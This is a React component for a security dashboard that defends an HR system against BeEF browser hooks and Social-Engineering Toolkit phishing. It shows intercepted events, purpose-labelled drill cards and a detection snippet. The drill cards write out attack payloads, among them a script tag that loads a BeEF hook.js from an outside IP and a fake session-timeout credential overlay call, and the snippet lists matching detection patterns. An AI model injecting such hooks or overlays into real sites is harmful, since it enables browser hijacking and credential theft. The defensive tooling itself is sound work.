import React, { useState, useEffect, useCallback } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Bug,
  Globe,
  Lock,
  Play,
  RefreshCw,
  Copy,
  Check,
  Ban,
  CheckCircle2,
  FileCode,
  EyeOff,
  Crosshair,
} from 'lucide-react';
import { api, authStorage } from '../services/api';
import { SocSeverityBadge } from './SocThemeBadge';

const rawApiUrl = (import.meta as any).env?.VITE_API_URL || '';
const API_BASE = rawApiUrl ? `${rawApiUrl.replace(/\/$/, '')}/api/v1` : '/api/v1';

function buildAuthHeaders(): Record<string, string> {
  const token = authStorage.getToken();
  return {
    'Content-Type': 'application/json',
    ...(token ? { Authorization: `Bearer ${token}` } : {}),
  };
}

interface BrowserPhishingEvent {
  id: string;
  vectorCategory: 'BEEF_BROWSER_HOOK' | 'SET_SOCIAL_ENGINEERING' | 'CSP_DOM_VIOLATION';
  vectorName: string;
  mitreTechnique: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  systemId: string;
  attackerIp: string;
  originLocation: string;
  targetEndpoint: string;
  interceptedArtifact: string;
  defenseAction: string;
  status: 'BLOCKED_AND_QUARANTINED' | 'CSP_DROPPED';
  timestampWat: string;
}

interface LookalikeDomain {
  domain: string;
  targetSystem: string;
  registrar: string;
  resolvedIp: string;
  vector: string;
  status: string;
  detectedAtWat: string;
}

interface DefensePosture {
  antiBeefDomShield: string;
  antiSetClonerGuard: string;
  cspHeaderPolicy: string;
  mutationObserverGuard: string;
  beefHooksBlocked: number;
  setClonersBlocked: number;
  lookalikeDomainsSinkholed: number;
}

interface BrowserPhishingDefenseProps {
  selectedSystem?: string;
  onDrillExecuted?: () => void;
}

export const BrowserPhishingDefense: React.FC<BrowserPhishingDefenseProps> = ({
  selectedSystem,
  onDrillExecuted,
}) => {
  const [activeTab, setActiveTab] = useState<'events' | 'drills' | 'domains' | 'sdk'>('events');
  const [posture, setPosture] = useState<DefensePosture | null>(null);
  const [events, setEvents] = useState<BrowserPhishingEvent[]>([]);
  const [domains, setDomains] = useState<LookalikeDomain[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [refreshing, setRefreshing] = useState<boolean>(false);
  const [runningScenario, setRunningScenario] = useState<string | null>(null);
  const [drillBanner, setDrillBanner] = useState<string | null>(null);
  const [blockedIps, setBlockedIps] = useState<Set<string>>(new Set());
  const [copiedSnippet, setCopiedSnippet] = useState<boolean>(false);

  const fetchDefenseData = useCallback(async () => {
    try {
      setRefreshing(true);
      const res = await fetch(`${API_BASE}/soc/human-browser-defense`, {
        headers: buildAuthHeaders(),
      });
      if (res.ok) {
        const data = await res.json();
        setPosture(data.posture || null);
        setEvents(Array.isArray(data.events) ? data.events : []);
        setDomains(Array.isArray(data.lookalikeDomains) ? data.lookalikeDomains : []);
      }
    } catch (err) {
      console.warn('[BrowserPhishingDefense] Failed to load telemetry:', err);
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  }, []);

  useEffect(() => {
    fetchDefenseData();
    const interval = setInterval(fetchDefenseData, 8000);
    return () => clearInterval(interval);
  }, [fetchDefenseData]);

  const handleRunSimulation = async (scenario: string, label: string) => {
    setRunningScenario(scenario);
    setDrillBanner(null);
    try {
      const res = await fetch(`${API_BASE}/soc/human-browser-defense/simulate`, {
        method: 'POST',
        headers: buildAuthHeaders(),
        body: JSON.stringify({
          scenario,
          systemId: selectedSystem || 'NOUN-HRMS',
        }),
      });
      if (res.ok) {
        const data = await res.json();
        setDrillBanner(
          `✓ Purple-Team Drill Completed [${label}]: ${data.defenseAction}. Incident logged & IP ${data.incident?.offending_ip} quarantined.`
        );
        await fetchDefenseData();
        onDrillExecuted?.();
      }
    } catch (err) {
      console.error('[BrowserPhishingDefense] Simulation error:', err);
    } finally {
      setRunningScenario(null);
    }
  };

  const handleQuarantineIp = async (ip: string, vectorName: string, sysId: string) => {
    try {
      await api.blockIp({
        ip,
        reason: `Anti-BeEF / Anti-SET Quarantine: ${vectorName}`,
        threatClassification: vectorName,
        systemId: sysId,
      });
      setBlockedIps((prev) => new Set(prev).add(ip));
      fetchDefenseData();
    } catch {}
  };

  const clientSideShieldSnippet = `// ─── noun-hrms-browser-shield.js ─────────────────────────────────────────
// Drop-in Client-Side Anti-BeEF (DOM Hook) & Anti-SET (Phishing Cloner) Guard
// Embed in NOUN-HRMS index.html to detect & neutralize hook.js and cloned portals.
(function () {
  const WATCH_CSP_ENDPOINT = '${rawApiUrl || 'https://the-watch-backend.onrender.com'}/api/v1/soc/csp-report';
  const ALLOWED_HOSTS = ['noun-hrms.edu.ng', 'noun-hrms.onrender.com', 'localhost', '127.0.0.1'];

  // 1. Anti-SET Cloned Domain & Frame-Busting Verification
  if (window.top !== window.self || !ALLOWED_HOSTS.some((h) => window.location.hostname.includes(h))) {
    fetch(WATCH_CSP_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        systemId: 'NOUN-HRMS',
        violatedDirective: 'SET_CLONED_PORTAL_OR_IFRAME_DETECTED',
        documentUri: window.location.href,
        blockedUri: document.referrer || window.location.origin,
      }),
    }).catch(() => {});
  }

  // 2. Anti-BeEF Real-Time DOM MutationObserver (Neutralizes hook.js & Pretty-Theft Overlays)
  const observer = new MutationObserver((mutations) => {
    for (const m of mutations) {
      m.addedNodes.forEach((node) => {
        if (node.nodeType !== 1) return;
        const el = node;
        const src = (el.getAttribute && (el.getAttribute('src') || el.getAttribute('href'))) || '';
        const html = (el.outerHTML || '').toLowerCase();
        if (
          (el.tagName === 'SCRIPT' && (src.includes('hook.js') || src.includes(':3000'))) ||
          html.includes('beefhook') ||
          html.includes('pretty_theft')
        ) {
          el.remove(); // Immediately kill injected BeEF script or fake credential modal
          fetch(WATCH_CSP_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              systemId: 'NOUN-HRMS',
              violatedDirective: 'BEEF_DOM_HOOK_NEUTRALIZED',
              documentUri: window.location.pathname,
              blockedUri: src || 'inline-beef-overlay',
            }),
          }).catch(() => {});
        }
      });
    }
  });
  observer.observe(document.documentElement, { childList: true, subtree: true });
})();`;

  const handleCopySnippet = () => {
    navigator.clipboard.writeText(clientSideShieldSnippet);
    setCopiedSnippet(true);
    setTimeout(() => setCopiedSnippet(false), 2000);
  };

  const drillCards = [
    {
      id: 'BEEF_HOOK_INJECTION',
      stage: 'STAGE 2: BeEF BROWSER HOOK',
      title: 'BeEF C2 Hook Script Injection (hook.js)',
      mitre: 'T1185 / T1059.007',
      attackerIp: '185.220.101.42 (Tor Exit)',
      payload: '<script src="http://185.220.101.42:3000/hook.js"></script>',
      description:
        'Tests whether an injected BeEF hook.js script tag targeting NOUN-HRMS is immediately intercepted by CSP + Heuristic WAF and the C2 IP is permanently quarantined.',
    },
    {
      id: 'BEEF_PRETTY_THEFT_OVERLAY',
      stage: 'STAGE 2: BeEF DOM OVERLAY',
      title: 'BeEF "Pretty Theft" Fake Session Modal',
      mitre: 'T1056.002 GUI Input Capture',
      attackerIp: '45.154.255.89 (Bulletproof Host)',
      payload: 'beef.net.send("/dh?bh=pretty_theft", { dialog: "NOUN_SESSION_TIMEOUT" })',
      description:
        'Simulates a hooked browser attempting to render a fake "Session Timed Out — Re-enter Password" overlay on NOUN-HRMS payroll pages.',
    },
    {
      id: 'SET_SITE_CLONER',
      stage: 'STAGE 1: SET SITE CLONER',
      title: 'SET Automated Login Portal Cloner',
      mitre: 'T1566.002 Spearphishing Link',
      attackerIp: '91.92.240.58 (Harvester Node)',
      payload: 'User-Agent: Social-Engineering-Toolkit/8.0.3 (HTTrack; wget --mirror)',
      description:
        'Simulates the Social-Engineering Toolkit (SET) Web Attack Vector attempting to mirror and clone the NOUN-HRMS login page for a phishing campaign.',
    },
    {
      id: 'SET_ROGUE_ORIGIN_HARVESTER',
      stage: 'STAGE 1: SET CREDENTIAL HARVESTER',
      title: 'SET Lookalike Domain Credential Relay',
      mitre: 'T1598.003 Spearphishing Service',
      attackerIp: '194.26.29.112 (Phish Proxy)',
      payload: 'phish_relay_origin=https://noun-hrms-login-verify.com&X-SET-Harvester-Relay=1',
      description:
        'Simulates a SET Credential Harvester on lookalike domain noun-hrms-login-verify.com attempting to relay captured credentials to NOUN-HRMS.',
    },
  ];

  return (
    <div className="space-y-6">
      {/* Top Header & KPI Bar */}
      <div className="bg-slate-900 border border-slate-700 rounded-xl p-5 shadow-sm space-y-4">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-4 border-b border-slate-700">
          <div className="flex items-start sm:items-center gap-3">
            <div className="p-2.5 rounded-xl bg-red-500/10 border border-red-500/30 text-red-400 shrink-0">
              <Bug className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2.5 flex-wrap">
                <h2 className="text-base sm:text-lg font-black text-slate-100 tracking-wide font-mono">
                  UNIFIED ANTI-BeEF (BROWSER HOOK) &amp; ANTI-SET (SOCIAL ENGINEERING) SHIELD
                </h2>
                <SocSeverityBadge severity="RESOLVED" label="DOM + PHISHING GUARD ARMED" />
              </div>
              <p className="text-xs text-slate-400 mt-0.5">
                Full kill-chain defense neutralizing <span className="text-slate-200 font-semibold">Stage 1 SET Phishing / Site-Cloners</span> and <span className="text-slate-200 font-semibold">Stage 2 BeEF hook.js DOM Exploitation</span> across NOUN-HRMS &amp; The Watch.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 shrink-0">
            <button
              onClick={fetchDefenseData}
              disabled={refreshing}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-slate-100 border border-slate-700 transition cursor-pointer"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${refreshing ? 'animate-spin text-blue-400' : ''}`} />
              <span>Refresh Shield</span>
            </button>
          </div>
        </div>

        {/* 4-Card Posture Metrics */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
          <div className="bg-slate-950 border border-slate-700 rounded-xl p-3.5">
            <div className="flex items-center justify-between text-[10px] font-mono uppercase text-slate-400 font-bold">
              <span>ANTI-BeEF DOM &amp; CSP SHIELD</span>
              <Lock className="w-3.5 h-3.5 text-emerald-400" />
            </div>
            <div className="mt-1.5 flex items-baseline justify-between">
              <span className="text-xl font-black text-slate-100 font-mono">
                {posture?.beefHooksBlocked ?? 2} Blocked
              </span>
              <SocSeverityBadge severity="RESOLVED" label="ENFORCING" />
            </div>
            <div className="text-[11px] text-slate-400 font-mono mt-1 truncate">
              Blocks hook.js, /dh?bh=, Pretty-Theft
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-700 rounded-xl p-3.5">
            <div className="flex items-center justify-between text-[10px] font-mono uppercase text-slate-400 font-bold">
              <span>ANTI-SET CLONER &amp; HARVESTER</span>
              <EyeOff className="w-3.5 h-3.5 text-blue-400" />
            </div>
            <div className="mt-1.5 flex items-baseline justify-between">
              <span className="text-xl font-black text-slate-100 font-mono">
                {posture?.setClonersBlocked ?? 2} Dropped
              </span>
              <SocSeverityBadge severity="RESOLVED" label="ARMED" />
            </div>
            <div className="text-[11px] text-slate-400 font-mono mt-1 truncate">
              Blocks HTTrack, SET Harvester, Rogue Referer
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-700 rounded-xl p-3.5">
            <div className="flex items-center justify-between text-[10px] font-mono uppercase text-slate-400 font-bold">
              <span>LOOKALIKE PHISHING DOMAINS</span>
              <Globe className="w-3.5 h-3.5 text-orange-400" />
            </div>
            <div className="mt-1.5 flex items-baseline justify-between">
              <span className="text-xl font-black text-slate-100 font-mono">
                {posture?.lookalikeDomainsSinkholed ?? domains.length} Sinkholed
              </span>
              <SocSeverityBadge severity="HIGH" label="QUARANTINED" />
            </div>
            <div className="text-[11px] text-slate-400 font-mono mt-1 truncate">
              n0un-hrms.com, noun-hrms-login-verify.com
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-700 rounded-xl p-3.5">
            <div className="flex items-center justify-between text-[10px] font-mono uppercase text-slate-400 font-bold">
              <span>BROWSER CSP POLICY</span>
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
            </div>
            <div className="mt-1.5 flex items-baseline justify-between">
              <span className="text-sm font-black text-emerald-400 font-mono">
                script-src &apos;self&apos;
              </span>
              <SocSeverityBadge severity="RESOLVED" label="LOCKED" />
            </div>
            <div className="text-[11px] text-slate-400 font-mono mt-1 truncate">
              frame-ancestors &apos;none&apos; + MutationObserver
            </div>
          </div>
        </div>

        {/* Sub-Navigation Pills */}
        <div className="flex flex-wrap items-center gap-2 pt-2">
          <button
            onClick={() => setActiveTab('events')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-bold transition border cursor-pointer ${
              activeTab === 'events'
                ? 'bg-blue-600 text-white border-blue-500/40'
                : 'bg-slate-800 hover:bg-slate-700 text-slate-100 border-slate-700'
            }`}
          >
            Intercepted BeEF &amp; SET Telemetry ({events.length})
          </button>
          <button
            onClick={() => setActiveTab('drills')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-bold transition border cursor-pointer ${
              activeTab === 'drills'
                ? 'bg-blue-600 text-white border-blue-500/40'
                : 'bg-slate-800 hover:bg-slate-700 text-slate-100 border-slate-700'
            }`}
          >
            Purple-Team Kill-Chain Drills (BeEF + SET)
          </button>
          <button
            onClick={() => setActiveTab('domains')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-bold transition border cursor-pointer ${
              activeTab === 'domains'
                ? 'bg-blue-600 text-white border-blue-500/40'
                : 'bg-slate-800 hover:bg-slate-700 text-slate-100 border-slate-700'
            }`}
          >
            Lookalike Phishing Domains ({domains.length})
          </button>
          <button
            onClick={() => setActiveTab('sdk')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-bold transition border cursor-pointer ${
              activeTab === 'sdk'
                ? 'bg-blue-600 text-white border-blue-500/40'
                : 'bg-slate-800 hover:bg-slate-700 text-slate-100 border-slate-700'
            }`}
          >
            NOUN-HRMS Browser Guard Snippet
          </button>
        </div>
      </div>

      {/* Feedback Banner on Purple-Team Drill */}
      {drillBanner && (
        <div className="bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 rounded-xl p-3.5 text-xs font-mono flex items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
            <span>{drillBanner}</span>
          </div>
          <button
            onClick={() => setDrillBanner(null)}
            className="text-slate-400 hover:text-slate-200 text-xs font-bold"
          >
            Dismiss
          </button>
        </div>
      )}

      {/* TAB 1: INTERCEPTED BeEF & SET EVENTS */}
      {activeTab === 'events' && (
        <div className="bg-slate-900 border border-slate-700 rounded-xl p-5 shadow-sm space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
            <div>
              <h3 className="text-sm font-bold text-slate-100 font-mono uppercase">
                LIVE INTERCEPTED BeEF HOOKS, CSP BLOCKS &amp; SET HARVESTER PROBES
              </h3>
              <p className="text-xs text-slate-400">
                Every browser hook attempt and social-engineering site cloner is automatically blocked and its IP quarantined across The Watch and NOUN-HRMS.
              </p>
            </div>
            <button
              onClick={() => setActiveTab('drills')}
              className="px-3 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold transition cursor-pointer shrink-0"
            >
              Run Validation Drill →
            </button>
          </div>

          {loading ? (
            <div className="py-12 text-center text-xs text-slate-400 font-mono">
              Loading Anti-BeEF &amp; Anti-SET telemetry...
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse text-xs">
                <thead>
                  <tr className="border-b border-slate-700 text-slate-400 font-semibold uppercase tracking-wider bg-slate-950">
                    <th className="py-2.5 px-3">Kill-Chain Stage</th>
                    <th className="py-2.5 px-3">Severity</th>
                    <th className="py-2.5 px-3">Vector &amp; MITRE</th>
                    <th className="py-2.5 px-3">Attacker / C2 IP</th>
                    <th className="py-2.5 px-3">Intercepted Payload / Hook Signature</th>
                    <th className="py-2.5 px-3">SOAR Defense Action</th>
                    <th className="py-2.5 px-3 text-right">Quarantine</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-700 font-mono">
                  {events.map((ev) => {
                    const isQuarantined = blockedIps.has(ev.attackerIp);
                    return (
                      <tr key={ev.id} className="odd:bg-slate-900 even:bg-slate-800/35 hover:bg-slate-800/80 transition">
                        <td className="py-3 px-3 whitespace-nowrap">
                          {ev.vectorCategory === 'SET_SOCIAL_ENGINEERING' ? (
                            <span className="px-2 py-0.5 rounded bg-orange-500/10 text-orange-400 border border-orange-500/30 text-[10px] font-bold">
                              STAGE 1: SET PHISHING
                            </span>
                          ) : (
                            <span className="px-2 py-0.5 rounded bg-red-500/10 text-red-400 border border-red-500/30 text-[10px] font-bold">
                              STAGE 2: BeEF HOOK
                            </span>
                          )}
                        </td>
                        <td className="py-3 px-3 whitespace-nowrap">
                          <SocSeverityBadge severity={ev.severity} />
                        </td>
                        <td className="py-3 px-3">
                          <div className="font-bold text-slate-100 font-sans">{ev.vectorName}</div>
                          <div className="text-[10px] text-blue-400">{ev.mitreTechnique}</div>
                          <div className="text-[10px] text-slate-500">
                            Target: {ev.systemId} ({ev.targetEndpoint})
                          </div>
                        </td>
                        <td className="py-3 px-3 whitespace-nowrap">
                          <div className="text-yellow-400 font-bold">{ev.attackerIp}</div>
                          <div className="text-[10px] text-slate-400">{ev.originLocation}</div>
                          <div className="text-[10px] text-slate-500">{ev.timestampWat}</div>
                        </td>
                        <td className="py-3 px-3 max-w-xs">
                          <div className="bg-slate-950 border border-slate-700 rounded p-2 text-[11px] text-red-300 break-all max-h-20 overflow-y-auto">
                            {ev.interceptedArtifact}
                          </div>
                        </td>
                        <td className="py-3 px-3 max-w-xs">
                          <span className="text-emerald-400 text-[11px] font-sans font-semibold block">
                            ✓ {ev.defenseAction}
                          </span>
                        </td>
                        <td className="py-3 px-3 text-right whitespace-nowrap">
                          <button
                            onClick={() => handleQuarantineIp(ev.attackerIp, ev.vectorName, ev.systemId)}
                            disabled={isQuarantined}
                            className={`px-2.5 py-1 rounded-lg text-[10px] font-bold inline-flex items-center gap-1 transition cursor-pointer ${
                              isQuarantined
                                ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                                : 'bg-slate-800 hover:bg-slate-700 text-slate-100 border border-slate-700'
                            }`}
                          >
                            {isQuarantined ? (
                              <>
                                <CheckCircle2 className="w-3 h-3 text-emerald-400" />
                                <span>LOCKED</span>
                              </>
                            ) : (
                              <>
                                <Ban className="w-3 h-3 text-red-400" />
                                <span>LOCK IP</span>
                              </>
                            )}
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 2: PURPLE-TEAM KILL-CHAIN DRILLS */}
      {activeTab === 'drills' && (
        <div className="bg-slate-900 border border-slate-700 rounded-xl p-5 shadow-sm space-y-4">
          <div>
            <h3 className="text-sm font-bold text-slate-100 font-mono uppercase">
              PURPLE-TEAM VALIDATION DRILLS: SET (STAGE 1) + BeEF (STAGE 2) KILL CHAIN
            </h3>
            <p className="text-xs text-slate-400 mt-0.5">
              Execute safe synthetic drills to verify that The Watch Heuristic Engine, Zeek NSM, Wireshark DPI, and Permanent IP Quarantine catch every SET and BeEF attack vector in real time.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {drillCards.map((drill) => {
              const isRunning = runningScenario === drill.id;
              return (
                <div
                  key={drill.id}
                  className="bg-slate-950 border border-slate-700 hover:border-slate-500 rounded-xl p-4 flex flex-col justify-between space-y-3 transition"
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between gap-2">
                      <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-blue-500/10 text-blue-400 border border-blue-500/30">
                        {drill.stage}
                      </span>
                      <SocSeverityBadge severity="CRITICAL" label={drill.mitre} />
                    </div>
                    <h4 className="text-sm font-bold text-slate-100">{drill.title}</h4>
                    <p className="text-xs text-slate-400 leading-relaxed">{drill.description}</p>
                    <div className="bg-slate-900 border border-slate-700 rounded-lg p-2.5 font-mono text-[11px] space-y-1">
                      <div className="text-slate-400">
                        Simulated Source: <span className="text-yellow-400 font-bold">{drill.attackerIp}</span>
                      </div>
                      <div className="text-red-300 break-all">{drill.payload}</div>
                    </div>
                  </div>

                  <div className="pt-2 border-t border-slate-800 flex items-center justify-between">
                    <span className="text-[11px] font-mono text-slate-400 flex items-center gap-1">
                      <Crosshair className="w-3.5 h-3.5 text-blue-400" /> Target: {selectedSystem || 'NOUN-HRMS'}
                    </span>
                    <button
                      onClick={() => handleRunSimulation(drill.id, drill.title)}
                      disabled={isRunning}
                      className="flex items-center gap-1.5 px-3.5 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold transition cursor-pointer"
                    >
                      <Play className={`w-3.5 h-3.5 ${isRunning ? 'animate-spin' : ''}`} />
                      <span>{isRunning ? 'Simulating Vector...' : 'Execute Defense Drill'}</span>
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* TAB 3: LOOKALIKE PHISHING DOMAINS WATCHLIST */}
      {activeTab === 'domains' && (
        <div className="bg-slate-900 border border-slate-700 rounded-xl p-5 shadow-sm space-y-4">
          <div>
            <h3 className="text-sm font-bold text-slate-100 font-mono uppercase">
              SET TYPOSQUATTED &amp; LOOKALIKE PHISHING DOMAINS WATCHLIST
            </h3>
            <p className="text-xs text-slate-400 mt-0.5">
              Domains detected attempting to impersonate NOUN-HRMS or The Watch login portals via SET credential harvesters or BeEF lure links.
            </p>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse text-xs">
              <thead>
                <tr className="border-b border-slate-700 text-slate-400 font-semibold uppercase tracking-wider bg-slate-950">
                  <th className="py-2.5 px-3">Lookalike Domain</th>
                  <th className="py-2.5 px-3">Impersonated Target</th>
                  <th className="py-2.5 px-3">Resolved Harvester IP</th>
                  <th className="py-2.5 px-3">Attack Vector</th>
                  <th className="py-2.5 px-3">Status</th>
                  <th className="py-2.5 px-3">Detected (WAT)</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700 font-mono">
                {domains.map((d) => (
                  <tr key={d.domain} className="odd:bg-slate-900 even:bg-slate-800/35 hover:bg-slate-800/80">
                    <td className="py-2.5 px-3 font-bold text-red-400">{d.domain}</td>
                    <td className="py-2.5 px-3 text-blue-400 font-bold">{d.targetSystem}</td>
                    <td className="py-2.5 px-3 text-yellow-400">{d.resolvedIp}</td>
                    <td className="py-2.5 px-3 text-slate-200 font-sans">{d.vector}</td>
                    <td className="py-2.5 px-3">
                      <SocSeverityBadge severity="RESOLVED" label={d.status} />
                    </td>
                    <td className="py-2.5 px-3 text-slate-400 text-[11px]">{d.detectedAtWat}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 4: DROP-IN NOUN-HRMS ANTI-BeEF & ANTI-SET BROWSER SHIELD SNIPPET */}
      {activeTab === 'sdk' && (
        <div className="bg-slate-900 border border-slate-700 rounded-xl p-5 shadow-sm space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <h3 className="text-sm font-bold text-slate-100 font-mono uppercase flex items-center gap-2">
                <FileCode className="w-4 h-4 text-blue-400" />
                <span>DROP-IN NOUN-HRMS BROWSER INTEGRITY &amp; ANTI-CLONING GUARD</span>
              </h3>
              <p className="text-xs text-slate-400 mt-0.5">
                Embed this lightweight script in NOUN-HRMS to automatically destroy injected BeEF <code className="text-slate-200">hook.js</code> tags via <code className="text-slate-200">MutationObserver</code> and alert The Watch SOC if the login page is cloned onto an unauthorized domain.
              </p>
            </div>
            <button
              onClick={handleCopySnippet}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold transition cursor-pointer shrink-0"
            >
              {copiedSnippet ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copiedSnippet ? 'Copied Snippet!' : 'Copy Browser Shield Script'}</span>
            </button>
          </div>

          <pre className="bg-slate-950 border border-slate-700 rounded-xl p-4 text-xs font-mono text-slate-200 overflow-x-auto leading-relaxed">
            {clientSideShieldSnippet}
          </pre>
        </div>
      )}
    </div>
  );
};
